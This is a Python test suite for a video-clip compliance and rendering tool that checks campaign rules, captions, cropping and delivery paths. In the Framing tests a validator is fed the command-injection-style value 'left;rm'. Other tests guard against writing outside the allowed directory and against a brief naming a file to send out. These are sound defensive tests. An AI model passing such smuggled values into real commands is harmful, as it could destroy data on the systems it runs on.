"""What the checker must never get wrong.

Every case here is a way a real submission has been thrown out: a second over
the limit, a missing tag, a scratch track on a campaign that adds its own sound.
The point of the suite is that these fail loudly in a build rather than quietly
in a payout.
"""
import json
import os
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "warden-shared", "scripts"))

WARDEN_DIR = tempfile.mkdtemp(prefix="warden-tests-")
os.environ["WARDEN_DIR"] = WARDEN_DIR

import warden
import warden_rules as R


def rules(**over):
    base = R.blank()
    base.update({"id": "test", "name": "Test campaign", "schema": 1})
    base["video"].update({"duration_min_s": 10, "duration_max_s": 30,
                          "width": 1080, "height": 1920, "aspect": "9:16",
                          "audio": "forbidden"})
    base["caption"].update({"required_hashtags": ["#AD"],
                            "required_mentions": ["@brand"],
                            "banned_terms": ["aposta"]})
    for key, value in over.items():
        if isinstance(value, dict) and isinstance(base.get(key), dict):
            base[key].update(value)
        else:
            base[key] = value
    return base


def media(**over):
    base = {"width": 1080, "height": 1920, "duration_s": 20.0,
            "audio_codec": None, "size_mb": 9.0, "codec": "h264"}
    base.update(over)
    return base


def levels(findings, level):
    return [m for lv, m in findings if lv == level]


class RuleSet(unittest.TestCase):
    def test_template_validates(self):
        good = rules()
        self.assertEqual(R.validate(good), [])

    def test_typo_in_a_key_is_caught(self):
        broken = rules()
        broken["video"]["duration_max"] = 30          # the real key is duration_max_s
        self.assertTrue(any("duration_max" in p for p in R.validate(broken)))

    def test_inverted_window_is_caught(self):
        broken = rules(video={"duration_min_s": 40, "duration_max_s": 10})
        self.assertTrue(any("above" in p for p in R.validate(broken)))

    def test_hashtag_without_hash(self):
        broken = rules(caption={"required_hashtags": ["AD"]})
        self.assertTrue(any("does not start with #" in p for p in R.validate(broken)))


class Checking(unittest.TestCase):
    def test_a_clean_clip_passes(self):
        found = warden.check(rules(), media(), "hook @brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.OK)

    def test_one_second_over_is_a_reject(self):
        found = warden.check(rules(), media(duration_s=30.4), "@brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.REPROVA)
        self.assertTrue(any("over the 30s maximum" in m for m in levels(found, warden.REPROVA)))

    def test_under_the_minimum_is_a_reject(self):
        found = warden.check(rules(), media(duration_s=8), "@brand #AD", [])
        self.assertEqual(warden.verdict(found), warden.REPROVA)

    def test_wrong_resolution_is_a_reject(self):
        found = warden.check(rules(), media(width=720, height=1280), "@brand #AD", [])
        self.assertTrue(any("1080x1920" in m for m in levels(found, warden.REPROVA)))

    def test_scratch_audio_when_the_platform_adds_the_sound(self):
        found = warden.check(rules(), media(audio_codec="aac"), "@brand #AD", [])
        self.assertTrue(any("audio track" in m for m in levels(found, warden.REPROVA)))

    def test_missing_hashtag(self):
        found = warden.check(rules(), media(), "just a hook @brand", [])
        self.assertTrue(any("#AD" in m for m in levels(found, warden.REPROVA)))

    def test_case_and_accents_do_not_smuggle_a_banned_word(self):
        found = warden.check(rules(), media(), "APOSTÁ @brand #AD", [])
        self.assertTrue(any("bans" in m for m in levels(found, warden.REPROVA)))

    def test_tags_match_regardless_of_case(self):
        found = warden.check(rules(), media(), "@Brand #ad", [])
        self.assertEqual(warden.verdict(found), warden.OK)

    def test_the_cap_stops_free_work(self):
        capped = rules(posting={"per_clipper_cap": 2})
        found = warden.check(capped, media(), "@brand #AD", [{}, {}])
        self.assertTrue(any("cap is 2" in m for m in levels(found, warden.REPROVA)))

    def test_a_closed_campaign_is_a_reject(self):
        closed = rules(posting={"deadline": "2020-01-01"})
        found = warden.check(closed, media(), "@brand #AD", [])
        self.assertTrue(any("closed on" in m for m in levels(found, warden.REPROVA)))

    def test_silence_of_the_brief_is_reported_not_invented(self):
        quiet = R.blank()
        quiet.update({"id": "quiet", "schema": 1})
        quiet["unknown"] = ["whether edits may carry an embedded track"]
        found = warden.check(quiet, media(), None, [])
        self.assertEqual(warden.verdict(found), warden.OK)
        self.assertTrue(any("does not settle it" in m for m in levels(found, warden.ATENCAO)))

    def test_source_rules_are_never_claimed_as_checked(self):
        sourced = rules(sources={"allowed": ["the official archive"]})
        found = warden.check(sourced, media(), "@brand #AD", [])
        self.assertTrue(any("only you can confirm" in m for m in levels(found, warden.ATENCAO)))
        self.assertFalse(any("only you can confirm" in m for m in levels(found, warden.OK)))


class Packaging(unittest.TestCase):
    def test_the_caption_carries_what_the_brief_demands(self):
        path = warden.campaign_path("pack")
        packed = rules(id="pack", caption={"required_text": ["Season 4 now streaming"]})
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as fh:
            json.dump(packed, fh)
        import io
        from contextlib import redirect_stdout
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            warden.main(["package", "--campaign", "pack", "--hook", "pov: he inherited it"])
        caption = buffer.getvalue()
        self.assertIn("pov: he inherited it", caption)
        self.assertIn("Season 4 now streaming", caption)
        self.assertIn("@brand", caption)
        self.assertIn("#AD", caption)

    def test_the_packaged_caption_passes_its_own_check(self):
        import io
        from contextlib import redirect_stdout
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            warden.main(["package", "--campaign", "pack", "--hook", "pov: he inherited it"])
        found = warden.check(rules(), media(), buffer.getvalue(), [])
        self.assertEqual(warden.verdict(found), warden.OK)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class Preferences(unittest.TestCase):
    """Taste is asked once, and the campaign still wins."""

    def setUp(self):
        import warden_prefs
        self.P = warden_prefs
        self.dir = tempfile.mkdtemp(prefix="warden-prefs-")

    def test_nothing_stored_means_everything_is_asked(self):
        self.assertEqual(self.P.missing({}), self.P.KEYS)

    def test_an_answer_is_never_asked_again(self):
        self.assertNotIn("delivery", self.P.missing({"delivery": "edit"}))

    def test_the_campaign_overrules_the_sound_and_says_so(self):
        settings, overruled = self.P.effective({"sound": "embedded"}, rules())
        self.assertEqual(settings["sound"], "platform")
        self.assertTrue(overruled)

    def test_sound_has_no_silent_default(self):
        """A clip must never ship silent by accident: with nobody having chosen
        and a campaign that does not settle audio, sound stays undecided."""
        self.assertNotIn("sound", self.P.DEFAULTS)
        quiet = rules(video={"audio": None})
        settings, _ = self.P.effective({}, quiet)
        self.assertIsNone(settings.get("sound"))
        # And it is asked, since it is not stored.
        self.assertIn("sound", self.P.missing({}, "edit"))

    def test_a_campaign_that_settles_audio_decides_sound_unasked(self):
        forbid = rules(video={"audio": "forbidden"})
        settings, _ = self.P.effective({}, forbid)
        self.assertEqual(settings["sound"], "platform")
        require = rules(video={"audio": "required"})
        settings, _ = self.P.effective({}, require)
        self.assertEqual(settings["sound"], "embedded")

    def test_the_campaign_caps_a_length_the_owner_asked_for(self):
        settings, overruled = self.P.effective({"target_s": 90}, rules())
        self.assertEqual(settings["target_s"], 30)
        self.assertTrue(any("caps a clip" in reason for reason in overruled))

    def test_a_length_inside_the_window_is_left_alone(self):
        settings, overruled = self.P.effective({"target_s": 25}, rules())
        self.assertEqual(settings["target_s"], 25)
        self.assertEqual(overruled, [])

    def test_preferences_survive_a_write_and_a_read(self):
        self.P.save(self.dir, {"delivery": "cuts", "batch": 5})
        self.assertEqual(self.P.load(self.dir)["batch"], 5)

    def test_every_default_is_a_question_and_only_sound_has_none(self):
        # Every default must belong to a real question.
        self.assertTrue(set(self.P.DEFAULTS).issubset(set(self.P.KEYS)))
        # And every question has a default except `sound`, which is deliberately
        # left without one so a clip cannot ship silent unasked.
        without_default = set(self.P.KEYS) - set(self.P.DEFAULTS)
        self.assertEqual(without_default, {"sound"})


class Beat(unittest.TestCase):
    """A cut lands on a bar, and never outside the campaign's window."""

    def setUp(self):
        import warden_beat
        self.B = warden_beat

    def test_snaps_to_the_nearest_whole_bar(self):
        length, bars = self.B.snap(17.3, 2.7842, 10, 60)
        self.assertEqual(bars, 6)
        self.assertAlmostEqual(length, 6 * 2.7842, places=2)

    def test_never_snaps_past_the_campaign_maximum(self):
        length, bars = self.B.snap(29.5, 2.7842, 10, 30)
        self.assertLessEqual(length, 30)
        self.assertEqual(bars, 10)

    def test_never_snaps_under_the_campaign_minimum(self):
        length, bars = self.B.snap(9.0, 2.7842, 20, 60)
        self.assertGreaterEqual(length, 20)

    def test_says_so_when_no_bar_count_fits(self):
        length, bars = self.B.snap(10, 9.0, 10, 12)     # a bar is longer than the window
        self.assertIsNone(length)

    def test_a_missing_grid_leaves_the_length_alone(self):
        length, bars = self.B.snap(17.3, 0, 10, 60)
        self.assertEqual(length, 17.3)
        self.assertIsNone(bars)


class ModelChoice(unittest.TestCase):
    """The transcription model is chosen by what the source costs."""

    def setUp(self):
        import warden_media
        self.M = warden_media
        self.saved = os.environ.pop("WARDEN_WHISPER", None)

    def tearDown(self):
        if self.saved is not None:
            os.environ["WARDEN_WHISPER"] = self.saved

    def test_a_short_source_gets_the_better_model(self):
        size, why = self.M.pick_model(300)
        self.assertEqual(size, "small")

    def test_a_long_source_gets_the_faster_model(self):
        size, why = self.M.pick_model(3600)
        self.assertEqual(size, "base")
        self.assertIn("minutes", why)

    def test_an_override_always_wins(self):
        os.environ["WARDEN_WHISPER"] = "medium"
        size, why = self.M.pick_model(3600)
        self.assertEqual(size, "medium")
        self.assertIn("WARDEN_WHISPER", why)

    def test_an_unknown_duration_does_not_downgrade(self):
        size, _ = self.M.pick_model(None)
        self.assertEqual(size, "small")


class Saving(unittest.TestCase):
    """A rule set is stored or the agent is told plainly that it is not."""

    def test_empty_input_is_refused_loudly(self):
        import io
        from contextlib import redirect_stderr
        err = io.StringIO()
        with redirect_stderr(err), self.assertRaises(SystemExit) as caught:
            warden.main(["campaign", "save", "--json", "   "])
        self.assertEqual(caught.exception.code, 2)
        self.assertIn("do not report this campaign as stored", err.getvalue())

    def test_a_saved_rule_set_reads_back(self):
        import io
        from contextlib import redirect_stdout
        out = io.StringIO()
        payload = json.dumps({"schema": 1, "id": "roundtrip", "name": "Round trip",
                              "video": {"duration_max_s": 30}})
        with redirect_stdout(out):
            warden.main(["campaign", "save", "--json", payload])
        self.assertIn("stored and verified", out.getvalue())
        self.assertEqual(warden.load_campaign("roundtrip")["name"], "Round trip")


class StateLocation(unittest.TestCase):
    """Where state lives is never a mystery, because two people looking at two
    directories is how an agent gets accused of lying."""

    def test_status_names_the_source_of_the_path(self):
        import io
        from contextlib import redirect_stdout
        out = io.StringIO()
        with redirect_stdout(out):
            warden.main(["status"])
        text = out.getvalue()
        self.assertIn("WARDEN_DIR in the environment", text)
        self.assertIn("writable:", text)


class RootOwnedState(unittest.TestCase):
    """The trap that took the agent down once: the state directory in a named
    volume gets created by whatever runs first, and an operator's `docker
    compose exec` is root. The agent then cannot write its own state. The image
    repairs ownership at boot; this pins the behaviour the repair exists for --
    an unwritable state directory is reported, never papered over with a false
    'saved'."""

    def setUp(self):
        import stat as _stat
        self.locked = tempfile.mkdtemp(prefix="warden-rootstate-")
        self.campaigns = os.path.join(self.locked, "campaigns")
        os.makedirs(self.campaigns, exist_ok=True)
        # Read+execute, no write, on both the state root and its campaigns dir:
        # what the agent's uid sees against a root-owned tree, reproduced without
        # being root. Locking only the root leaves the pre-made campaigns dir
        # writable, which is not the trap; the trap is the agent unable to write
        # its state at all.
        os.chmod(self.campaigns, _stat.S_IRUSR | _stat.S_IXUSR)
        os.chmod(self.locked, _stat.S_IRUSR | _stat.S_IXUSR)
        self._saved = os.environ.get("WARDEN_DIR")
        os.environ["WARDEN_DIR"] = self.locked

    def tearDown(self):
        import stat as _stat
        os.chmod(self.locked, _stat.S_IRWXU)
        os.chmod(self.campaigns, _stat.S_IRWXU)
        if self._saved is not None:
            os.environ["WARDEN_DIR"] = self._saved

    def test_status_says_the_state_is_not_writable(self):
        import io
        from contextlib import redirect_stdout
        if os.access(self.locked, os.W_OK):
            self.skipTest("this filesystem/user ignores the write bit (root?)")
        out = io.StringIO()
        with redirect_stdout(out):
            warden.main(["status"])
        self.assertIn("writable: NO", out.getvalue())

    def test_a_save_into_an_unwritable_state_never_reports_success(self):
        import io
        from contextlib import redirect_stdout
        if os.access(self.locked, os.W_OK):
            self.skipTest("this filesystem/user ignores the write bit (root?)")
        good = json.dumps(rules(id="x"))          # validates, so only the write can fail
        out = io.StringIO()
        with self.assertRaises(Exception):        # PermissionError, uncaught -- loud, not a false "saved"
            with redirect_stdout(out):
                warden.main(["campaign", "save", "--json", good])
        self.assertNotIn("stored and verified", out.getvalue())


class Delivery(unittest.TestCase):
    """A clip nobody can open is the same as no clip.

    The runtime attaches a file only from a short list of directories, and the
    one this agent's state lives in is not on it. These pin the two halves of
    that: where a render lands, and the line that hands it over.
    """

    def test_a_bare_filename_lands_in_the_deliverable_directory(self):
        got = warden.clip_out("clip-01.mp4")
        self.assertEqual(os.path.dirname(got),
                         os.path.realpath(warden.clips_dir()))

    def test_the_deliverable_directory_is_a_place_this_agent_may_write(self):
        inside = os.path.join(warden.clips_dir(), "clip.mp4")
        self.assertEqual(warden.safe_out(inside, "clip"), os.path.realpath(inside))

    def test_a_full_path_outside_is_still_refused(self):
        with self.assertRaises(SystemExit):
            warden.clip_out("/etc/anything.mp4")

    def test_in_the_image_the_directory_is_the_one_the_runtime_allows(self):
        """/var/lib is denied by the runtime's media validator and
        /var/lib/hermes/cache/videos is allowlisted back in ahead of it. The
        path is not ours to choose, so it is pinned here rather than described
        in a comment somebody can edit."""
        seen = []
        real_isdir, real_makedirs = os.path.isdir, os.makedirs
        os.environ.pop("WARDEN_DIR", None)
        try:
            os.path.isdir = lambda p: True if p == "/var/lib/hermes" else real_isdir(p)
            os.makedirs = lambda p, **kw: seen.append(p)
            self.assertEqual(warden.clips_dir(), "/var/lib/hermes/cache/videos")
        finally:
            os.path.isdir, os.makedirs = real_isdir, real_makedirs
            os.environ["WARDEN_DIR"] = WARDEN_DIR
        self.assertEqual(seen, ["/var/lib/hermes/cache/videos"])


def _ffmpeg_or_skip():
    import shutil
    if not (shutil.which("ffmpeg") and shutil.which("ffprobe")):
        raise unittest.SkipTest("ffmpeg/ffprobe not on PATH")


def _subtitles_filter_or_skip():
    """Burning captions needs ffmpeg built with libass. The image has it; a
    homebrew ffmpeg often does not, so the burn test skips there rather than
    failing on a missing filter that is present where it matters."""
    _ffmpeg_or_skip()
    import subprocess
    out = subprocess.run(["ffmpeg", "-hide_banner", "-filters"],
                         capture_output=True, text=True).stdout
    if " subtitles " not in out:
        raise unittest.SkipTest("this ffmpeg has no subtitles filter (no libass)")


def _make_source(path, seconds=6, w=1920, h=1080, audio=True, pattern="testsrc2"):
    """A tiny real clip, generated by ffmpeg, so a test can cut it and check it.

    Landscape by default: that is the shape a 9:16 render actually has to solve,
    and the shape that made the framing bug show up. pattern="black" gives a
    plain black frame, so a burned caption is the only thing that is not black."""
    import subprocess
    src = (f"color=c=black:size={w}x{h}:rate=30" if pattern == "black"
           else f"testsrc2=size={w}x{h}:rate=30")
    args = ["ffmpeg", "-y", "-loglevel", "error", "-f", "lavfi", "-i", src]
    if audio:
        args += ["-f", "lavfi", "-i", "sine=frequency=440:sample_rate=48000"]
    args += ["-t", str(seconds), "-c:v", "libx264", "-preset", "ultrafast",
             "-pix_fmt", "yuv420p"]
    if audio:
        args += ["-c:a", "aac", "-shortest"]
    args += [path]
    subprocess.run(args, check=True, capture_output=True)
    return path


class RealRender(unittest.TestCase):
    """The suite is fast because nothing touches video. These few do, because a
    checker that has never judged a file ffmpeg wrote is a checker on trust."""

    def setUp(self):
        _ffmpeg_or_skip()
        import warden_media
        self.M = warden_media
        self.dir = tempfile.mkdtemp(prefix="warden-render-")
        self.src = _make_source(os.path.join(self.dir, "src.mp4"))

    def test_cut_produces_a_file_the_check_then_clears(self):
        """cut renders, and check -- the real gate -- passes the render cut made
        to the campaign's own numbers. The two halves of the promise, end to end."""
        r = rules(video={"duration_min_s": 3, "duration_max_s": 5,
                         "width": 1080, "height": 1920, "aspect": "9:16",
                         "audio": "forbidden"},
                  caption={"required_hashtags": [], "required_mentions": [],
                          "banned_terms": []})
        out = os.path.join(self.dir, "clip.mp4")
        result = self.M.cut(self.src, out, r, start=1, end=4, sound="platform", crop="center")
        self.assertTrue(os.path.isfile(out))
        media = warden.probe(out)
        # The render sits inside the window it was cut to.
        self.assertLessEqual(media["duration_s"], 5.0)
        self.assertEqual((media["width"], media["height"]), (1080, 1920))
        # And the gate agrees: no REJECT on the file cut just wrote.
        findings = warden.check(r, media, "", [])
        self.assertEqual(warden.verdict(findings), warden.OK,
                         [m for lv, m in findings if lv == warden.REPROVA])

    def test_a_silent_campaign_render_carries_no_audio(self):
        """forbidden audio is the scratch-track rejection. The render must strip
        it, and check must confirm the strip on the real file."""
        r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                         "audio": "forbidden"})
        out = os.path.join(self.dir, "silent.mp4")
        self.M.cut(self.src, out, r, start=0, end=4, sound="platform", crop="center")
        media = warden.probe(out)
        self.assertFalse(media.get("audio_codec"),
                         "a forbidden-audio campaign must ship silent")
        findings = warden.check(r, media, "", [])
        self.assertFalse(any("audio track" in m for lv, m in findings
                             if lv == warden.REPROVA))

    def test_cut_refuses_to_render_without_a_sound_decision(self):
        """warden cut, through main, must stop rather than silence a clip when
        neither the campaign nor the owner has chosen the sound."""
        import io
        from contextlib import redirect_stdout
        cid = "sound-undecided"
        r = rules(id=cid, video={"audio": None, "duration_max_s": 30,
                                 "width": 1080, "height": 1920})
        os.makedirs(os.path.dirname(warden.campaign_path(cid)), exist_ok=True)
        with open(warden.campaign_path(cid), "w") as fh:
            json.dump(r, fh)
        # No stored sound preference in this test's WARDEN_DIR.
        import warden_prefs as P
        if os.path.exists(P.path(WARDEN_DIR)):
            os.remove(P.path(WARDEN_DIR))
        out = io.StringIO()
        with self.assertRaises(SystemExit):
            with redirect_stdout(out):
                warden.main(["cut", self.src, "--campaign", cid, "--crop", "center",
                             "--start", "0", "--end", "3", "--out", "s.mp4"])
        self.assertNotIn("MEDIA:", out.getvalue())

    def test_cut_clamps_a_long_window_to_the_campaign_maximum(self):
        r = rules(video={"duration_min_s": 1, "duration_max_s": 3,
                         "width": 1080, "height": 1920, "audio": "forbidden"})
        out = os.path.join(self.dir, "clamped.mp4")
        result = self.M.cut(self.src, out, r, start=0, end=6, sound="platform", crop="center")
        self.assertLessEqual(warden.probe(out)["duration_s"], 3.5)
        self.assertTrue(any("trimmed" in n for n in result["notes"]))

    def _white_pixels(self, mp4):
        """How many near-white pixels a frame has. On a black source, that is the
        caption and nothing else -- a real measurement of whether words landed on
        the picture, not just that two files differ."""
        import subprocess
        png = mp4 + ".png"
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", mp4,
                        "-frames:v", "1", png], check=True, capture_output=True)
        raw = subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-i", png,
                              "-f", "rawvideo", "-pix_fmt", "gray", "pipe:1"],
                             capture_output=True).stdout
        return sum(1 for b in raw if b > 200)

    def test_captions_are_actually_burned_into_the_picture(self):
        """A render real, com a legenda na tela. A fonte é preta, então todo pixel
        branco é legenda: sem ela, zero; com ela, milhares. Prova que a palavra
        chegou na imagem, não só que dois arquivos diferem. E o cut avisa do risco
        de dobrar, nunca queima calado."""
        _subtitles_filter_or_skip()
        black = os.path.join(self.dir, "black.mp4")
        _make_source(black, seconds=4, w=1920, h=1080, audio=False, pattern="black")
        srt = os.path.join(self.dir, "cap.srt")
        with open(srt, "w") as fh:
            fh.write(self.M.to_srt([{"start": 0.0, "end": 4.0,
                                     "text": "LEGENDA DE TESTE"}]))
        r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                         "audio": "forbidden"})
        plain = os.path.join(self.dir, "plain.mp4")
        capped = os.path.join(self.dir, "capped.mp4")
        self.M.cut(black, plain, r, start=0, end=3, sound="platform", crop="center")
        result = self.M.cut(black, capped, r, start=0, end=3, sound="platform", crop="center",
                            caption_srt=srt)
        white_plain = self._white_pixels(plain)
        white_capped = self._white_pixels(capped)
        self.assertLess(white_plain, 500, "the plain clip should be near-black")
        self.assertGreater(white_capped, white_plain + 3000,
                           "no white text landed on the picture -- caption did not burn")
        # And it warned about the doubling rather than burning silently.
        self.assertTrue(any("check the first clip" in n for n in result["notes"]))

    def test_a_campaign_that_says_the_archive_is_captioned_burns_nothing(self):
        """The owner's per-campaign answer, enforced: when the archive already
        carries captions, --subtitles is ignored rather than stacked on top."""
        _subtitles_filter_or_skip()
        black = os.path.join(self.dir, "black.mp4")
        _make_source(black, seconds=4, w=1920, h=1080, audio=False, pattern="black")
        srt = os.path.join(self.dir, "cap.srt")
        with open(srt, "w") as fh:
            fh.write(self.M.to_srt([{"start": 0.0, "end": 4.0, "text": "NAO DEVE"}]))
        r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                         "audio": "forbidden"},
                  sources={"archive_has_captions": True})
        out = os.path.join(self.dir, "nocap.mp4")
        result = self.M.cut(black, out, r, start=0, end=3, sound="platform", crop="center",
                            caption_srt=srt)
        self.assertLess(self._white_pixels(out), 500,
                        "captions were burned despite archive_has_captions=true")
        self.assertTrue(any("already carries its own" in n for n in result["notes"]))


class Subtitles(unittest.TestCase):
    """Whisper's words become a caption track, and a wrong or empty line is worse
    than none. These pin what survives into the SRT and what is dropped."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_the_srt_carries_the_transcript_timing(self):
        srt = self.M.to_srt([{"start": 1.5, "end": 3.2, "text": "primeira"},
                             {"start": 7.0, "end": 8.25, "text": "segunda"}])
        self.assertIn("00:00:01,500 --> 00:00:03,200", srt)
        self.assertIn("00:00:07,000 --> 00:00:08,250", srt)
        # Renumbered with no gap, in time order.
        self.assertTrue(srt.startswith("1\n"))
        self.assertIn("\n2\n", srt)

    def test_structural_garbage_is_dropped_not_burned(self):
        srt = self.M.to_srt([
            {"start": 0.0, "end": 1.0, "text": "boa"},
            {"start": 1.0, "end": 1.0, "text": "sem duração"},     # end == start
            {"start": 2.0, "end": 1.0, "text": "invertida"},       # end < start
            {"start": 3.0, "end": 4.0, "text": "   "},             # só espaço
            {"start": None, "end": 5.0, "text": "sem início"},
            {"start": "x", "end": 6.0, "text": "tempo não numérico"},
            {"end": 7.0, "text": "sem chave start"},
        ])
        self.assertIn("boa", srt)
        for bad in ("sem duração", "invertida", "sem início",
                    "não numérico", "sem chave start"):
            self.assertNotIn(bad, srt)
        # Exactly one cue survived, numbered 1.
        self.assertEqual(srt.count(" --> "), 1)
        self.assertTrue(srt.startswith("1\n"))

    def test_an_all_empty_transcript_writes_nothing_to_burn(self):
        self.assertEqual(self.M.to_srt([]), "")
        self.assertEqual(self.M.to_srt([{"start": 0, "end": 1, "text": "  "}]), "")

    def test_out_of_order_segments_are_sorted(self):
        srt = self.M.to_srt([{"start": 9.0, "end": 10.0, "text": "depois"},
                             {"start": 1.0, "end": 2.0, "text": "antes"}])
        self.assertLess(srt.index("antes"), srt.index("depois"))

    def test_the_ass_carries_a_style_and_the_lines(self):
        """The burn uses ASS, not force_style, because a multi-field force_style
        renders nothing on this ffmpeg. So the style has to live in the file."""
        ass = self.M.to_ass([{"start": 1.0, "end": 2.0, "text": "olá"}],
                            1080, 1920)
        self.assertIn("[V4+ Styles]", ass)
        self.assertIn("Style: Default", ass)
        self.assertIn("Dialogue: 0,0:00:01.00,0:00:02.00,Default", ass)
        self.assertIn("olá", ass)

    def test_the_ass_drops_the_same_garbage_the_srt_does(self):
        ass = self.M.to_ass([
            {"start": 0.0, "end": 1.0, "text": "boa"},
            {"start": 1.0, "end": 1.0, "text": "sem duração"},
            {"start": 3.0, "end": 4.0, "text": "   "},
            {"start": None, "end": 5.0, "text": "sem início"},
        ], 1080, 1920)
        self.assertIn("boa", ass)
        for bad in ("sem duração", "sem início"):
            self.assertNotIn(bad, ass)
        self.assertEqual(ass.count("Dialogue:"), 1)

    def test_an_ass_override_brace_in_the_text_is_neutralised(self):
        """A lone brace opens an ASS override block and could swallow the line or
        smuggle formatting. Whisper will not write one on purpose, but the tool
        must not pass it through."""
        ass = self.M.to_ass([{"start": 0.0, "end": 1.0,
                             "text": "antes {\\an8}depois"}], 1080, 1920)
        self.assertNotIn("{", ass.split("[Events]")[1])
        self.assertEqual(ass.count("Dialogue:"), 1)

    def test_an_all_empty_transcript_writes_no_ass(self):
        self.assertEqual(self.M.to_ass([], 1080, 1920), "")

    def test_captions_are_shifted_onto_the_clip_timeline(self):
        """The clip is cut with -ss, so it starts at 0 while the transcript is
        still in source time. A cue at source 19-21s on a clip cut from 20s must
        land at clip 0-1s, not 19-21s -- burn it unshifted and it shows over the
        wrong shot, two at once. Cues outside the window are dropped."""
        # Cues curtas de propósito: o reflow parte qualquer cue acima de ~2,2s,
        # e o que esta prova é o DESLOCAMENTO, não a quebra.
        segs = [{"start": 19.0, "end": 21.0, "text": "no comeco"},
                {"start": 39.0, "end": 40.5, "text": "no fim"},
                {"start": 5.0, "end": 8.0, "text": "antes do corte"}]
        ass = self.M.to_ass(segs, 1080, 1920, offset=20.0, length=20.0)
        self.assertIn("no comeco", ass)                       # 19-21 -> clip 0-1
        self.assertIn("Dialogue: 0,0:00:00.00,0:00:01.00", ass)
        self.assertIn("no fim", ass)                          # 39-40,5 -> clip 19-20 (clamped)
        self.assertNotIn("antes do corte", ass)               # source 5-8s is before the window

    def test_a_cue_fully_before_the_window_is_dropped(self):
        ass = self.M.to_ass([{"start": 2.0, "end": 4.0, "text": "fora"}],
                            1080, 1920, offset=20.0, length=20.0)
        self.assertEqual(ass, "")

    def test_wrap_is_enabled_so_a_long_line_stays_in_frame(self):
        ass = self.M.to_ass([{"start": 0.0, "end": 2.0, "text": "linha"}],
                            1080, 1920)
        self.assertIn("WrapStyle: 0", ass)
        self.assertNotIn("WrapStyle: 2", ass)

    def test_archive_has_captions_only_takes_a_bool_or_null(self):
        for good in (True, False, None):
            r = rules(sources={"archive_has_captions": good})
            self.assertEqual(R.validate(r), [], good)
        bad = rules(sources={"archive_has_captions": "yes"})
        self.assertTrue(any("archive_has_captions" in p for p in R.validate(bad)))


class DeliveryLine(unittest.TestCase):
    """The MEDIA: line is the only thing that leaves this container, so it must
    come from the tool and point only at a clip the tool rendered -- never at a
    path some brief named. A stranger's brief that asks for a file cannot be
    honoured by pointing MEDIA: at it, because the tool never prints such a line.
    """

    def setUp(self):
        _ffmpeg_or_skip()
        import io, warden_media
        self.io = io
        self.dir = tempfile.mkdtemp(prefix="warden-line-")
        self.src = _make_source(os.path.join(self.dir, "src.mp4"))

    def _store(self, cid, **video):
        r = rules(id=cid, video=video, caption={"required_hashtags": [],
                  "required_mentions": [], "banned_terms": []})
        os.makedirs(os.path.dirname(warden.campaign_path(cid)), exist_ok=True)
        with open(warden.campaign_path(cid), "w") as fh:
            json.dump(r, fh)

    def _run_cut(self, argv):
        from contextlib import redirect_stdout
        buf = self.io.StringIO()
        with redirect_stdout(buf):
            code = warden.main(argv)
        return code, buf.getvalue()

    def test_the_only_media_line_is_the_one_the_tool_prints(self):
        """grep proves warden.py has exactly one MEDIA: emitter; this proves it
        fires on a clean render and points into the deliverable directory."""
        self._store("line-ok", duration_min_s=3, duration_max_s=5,
                    width=1080, height=1920, aspect="9:16", audio="forbidden")
        code, out = self._run_cut(["cut", self.src, "--campaign", "line-ok", "--crop", "center",
                                   "--start", "1", "--end", "4", "--out", "c.mp4"])
        media_lines = [l for l in out.splitlines() if l.startswith("MEDIA:")]
        self.assertEqual(code, 0)
        self.assertEqual(len(media_lines), 1)
        path = media_lines[0][len("MEDIA:"):]
        # It is the clip the tool wrote, under the deliverable directory, never
        # the source and never anything a brief could have named.
        self.assertTrue(path.startswith(os.path.realpath(warden.clips_dir()) + os.sep),
                        path)
        self.assertTrue(os.path.isfile(path))
        self.assertNotEqual(os.path.realpath(path), os.path.realpath(self.src))

    def test_a_rejected_render_prints_no_media_line(self):
        """No line, no send. A render the check rejects must not offer a path to
        deliver -- exit 1, and nothing that starts with MEDIA:."""
        # A tiny file cap the render cannot meet, so check rejects after cut.
        self._store("line-reject", duration_max_s=5, width=1080, height=1920,
                    audio="forbidden", max_file_mb=0.001)
        code, out = self._run_cut(["cut", self.src, "--campaign", "line-reject", "--crop", "center",
                                   "--start", "0", "--end", "4", "--out", "r.mp4"])
        self.assertEqual(code, 1)
        self.assertFalse(any(l.startswith("MEDIA:") for l in out.splitlines()),
                         "a rejected render must not print a MEDIA: line")


class Framing(unittest.TestCase):
    """A landscape source cropped to 9:16 keeps a band, and the default centre
    is a guess. These pin the lever the agent uses when the guess is wrong."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_crop_names_map_to_left_centre_right(self):
        self.assertEqual(self.M._crop_fraction(None), 0.5)
        self.assertEqual(self.M._crop_fraction("center"), 0.5)
        self.assertLess(self.M._crop_fraction("left"), 0.5)
        self.assertGreater(self.M._crop_fraction("right"), 0.5)

    def test_a_percentage_places_the_band(self):
        self.assertEqual(self.M._crop_fraction("0"), 0.0)
        self.assertEqual(self.M._crop_fraction("100"), 1.0)
        self.assertAlmostEqual(self.M._crop_fraction("25"), 0.25)

    def test_a_crop_that_is_not_a_place_is_refused(self):
        for bad in ("middle", "-5", "150", "left;rm"):
            with self.assertRaises(RuntimeError):
                self.M._crop_fraction(bad)

    def test_auto_is_a_valid_crop_hint(self):
        self.assertEqual(self.M._crop_fraction("auto"), 0.5)

    def test_face_crop_centres_the_band_on_the_face(self):
        # A face at x=0.16 of the source, kept band ~0.32 wide: the band should
        # start near 0 so the face sits in its middle.
        faces = [(0.16, 0.05), (0.67, 0.04)]      # left panel + right panel
        fx = self.M._face_crop_fraction(faces, "left", 0.32)
        self.assertIsNotNone(fx)
        left_edge = fx * (1 - 0.32)
        self.assertLessEqual(left_edge, 0.16)      # face is inside the kept band
        self.assertGreaterEqual(left_edge + 0.32, 0.16)

